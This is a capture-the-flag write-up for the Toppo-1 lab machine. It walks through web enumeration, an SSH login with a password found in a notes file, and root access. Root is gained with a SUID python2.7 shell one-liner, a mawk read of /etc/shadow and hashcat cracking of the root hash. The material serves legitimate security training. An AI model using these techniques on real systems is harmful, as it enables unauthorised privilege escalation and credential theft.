# Table of contents

- [Recon](#recon)
  - [TCP/80 - HTTP](#tcp80---http)
    - [FFUF](#ffuf)
    - [Nikto](#nikto)
- [Initial Foothold](#initial-foothold)
  - [TCP/80 - HTTP - Rabbit Hole](#tcp80---http---rabbit-hole)
  - [TCP/22 - SSH](#tcp22---ssh)
- [Privilege Escalation](#privilege-escalation)
  - [Root - Via SUID Binary (GTFO BIN)](#root---via-suid-binary-gtfo-bin)


# Recon
## TCP/80 - HTTP
### FFUF
```
┌──(root💀kali)-[~/vulnHub/Toppo-1]
└─# ffuf -u  http://192.168.110.6/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php' -fw 22

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.110.6/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .txt .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 22
________________________________________________

about.html              [Status: 200, Size: 5030, Words: 1293, Lines: 130]
admin                   [Status: 301, Size: 314, Words: 20, Lines: 10]
contact.html            [Status: 200, Size: 7016, Words: 1892, Lines: 170]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10]
img                     [Status: 301, Size: 312, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 6437, Words: 2028, Lines: 184]
index.html              [Status: 200, Size: 6437, Words: 2028, Lines: 184]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10]
LICENSE                 [Status: 200, Size: 1093, Words: 156, Lines: 22]
mail                    [Status: 301, Size: 313, Words: 20, Lines: 10]
manual                  [Status: 301, Size: 315, Words: 20, Lines: 10]
post.html               [Status: 200, Size: 8262, Words: 2059, Lines: 168]
vendor                  [Status: 301, Size: 315, Words: 20, Lines: 10]
:: Progress: [18460/18460] :: Job [1/1] :: 363 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```
- `admin`
- `mail`

### Nikto
```
┌──(root💀kali)-[~/vulnHub/Toppo-1]
└─# nikto -ask=no -h http://192.168.110.6:80 2>&1 | tee "/root/vulnHub/Toppo-1/192.168.110.6/scans/tcp80/tcp_80_http_nikto.txt"
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.110.6
+ Target Hostname:    192.168.110.6
+ Target Port:        80
+ Start Time:         2022-01-29 01:29:32 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 1925, size: 563f5cf714e80, mtime: gzip
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: /admin/: Directory indexing found.
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3268: /mail/: Directory indexing found.
+ OSVDB-3092: /mail/: This might be interesting...
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /package.json: Node.js package file found. It may contain sensitive information.
+ 7915 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2022-01-29 01:30:25 (GMT8) (53 seconds)
-------------------------------------------------------------------------
```
- `package.json`


# Initial Foothold
## TCP/80 - HTTP - Rabbit Hole
1. View enumerated directories
	- `admin`
		![](Pasted%20image%2020220129013752.png)
		- `notes.txt`
	- `notes.txt`
		![](Pasted%20image%2020220129013825.png)
		- ted?
		- 12345ted123
	- `package.json`
		![](Pasted%20image%2020220129014026.png)
	- `mail`
		![](Pasted%20image%2020220129014239.png)
2. Detect LFI vulnerability at `contact_me.php`
	```
	┌───(root💀kali)-[~/vulnHub/Toppo-1]
	└─# ffuf -u http://192.168.110.6/mail/contact_me.php?W2:W1 -w /usr/share/wordlists/LFI/file_inclusion_linux.txt:W1 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:W2  -fw 3

			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : GET
	 :: URL              : http://192.168.110.6/mail/contact_me.php?W2:W1
	 :: Wordlist         : W1: /usr/share/wordlists/LFI/file_inclusion_linux.txt
	 :: Wordlist         : W2: /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	 :: Filter           : Response words: 3
	________________________________________________

	:: Progress: [3103145/5820412] :: Job [1/1] :: 3972 req/sec :: Duration: [0:12:20] :: Errors: 0 
	```
	- Not susceptible to LFI
3. At this point, I think TCP/80 is a rabbit hole

## TCP/22 - SSH 
1. SSH with ted:12345ted123
	![](Pasted%20image%2020220129020027.png)

# Privilege Escalation
## Root - Via SUID Binary (GTFO BIN)
1. Enumerate SUID Binaries
	```
	ted@Toppo:~$ find / -perm -4000 2>/dev/null 
	/sbin/mount.nfs
	/usr/sbin/exim4
	/usr/lib/eject/dmcrypt-get-device
	/usr/lib/dbus-1.0/dbus-daemon-launch-helper
	/usr/lib/openssh/ssh-keysign
	/usr/bin/gpasswd
	/usr/bin/newgrp
	/usr/bin/python2.7
	/usr/bin/chsh
	/usr/bin/at
	/usr/bin/mawk
	/usr/bin/chfn
	/usr/bin/procmail
	/usr/bin/passwd
	/bin/su
	/bin/umount
	/bin/mount
	```
	- `python2.7` has a [GTFOBins](https://gtfobins.github.io/gtfobins/python/) entry
	- `mawk` also has a [GTFOBins](https://gtfobins.github.io/gtfobins/mawk/) entry
2. Exploit `python2.7` to spawn a root shell
	```
	/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
	```
	![](Pasted%20image%2020220129020551.png)
3. Exploit `mawk` to read root's hash
	```
	LFILE=/etc/shadow
	ted@Toppo:~$ /usr/bin/mawk '//' "$LFILE" | grep root | cut -d ":" -f2
	$6$5UK1sFDk$sf3zXJZ3pwGbvxaQ/1zjaT0iyvw36oltl8DhjTq9Bym0uf2UHdDdRU4KTzCkqqsmdS2cFz.MIgHS/bYsXmBjI0
	```
4. Crack hash
	```
	┌──(root💀kali)-[~/vulnHub/Toppo-1]
	└─# hashcat -a 0 -m 1800 '$6$5UK1sFDk$sf3zXJZ3pwGbvxaQ/1zjaT0iyvw36oltl8DhjTq9Bym0uf2UHdDdRU4KTzCkqqsmdS2cFz.MIgHS/bYsXmBjI0' /usr/share/wordlists/rockyou.txt --show
	$6$5UK1sFDk$sf3zXJZ3pwGbvxaQ/1zjaT0iyvw36oltl8DhjTq9Bym0uf2UHdDdRU4KTzCkqqsmdS2cFz.MIgHS/bYsXmBjI0:test123
	```
	- root:test123	
5. Root Flag
	```
	# cd /root
	# ls 
	flag.txt
	# cat f	
	cat: f: No such file or directory
	# cat flag.txt
	_________                                  
	|  _   _  |                                 
	|_/ | | \_|.--.   _ .--.   _ .--.    .--.   
		| |  / .'`\ \[ '/'`\ \[ '/'`\ \/ .'`\ \ 
	   _| |_ | \__. | | \__/ | | \__/ || \__. | 
	  |_____| '.__.'  | ;.__/  | ;.__/  '.__.'  
					 [__|     [__|              




	Congratulations ! there is your flag : 0wnedlab{p4ssi0n_c0me_with_pract1ce}
	```



---
Tags: #linux-priv-esc/suid/gtfo-bin 

---
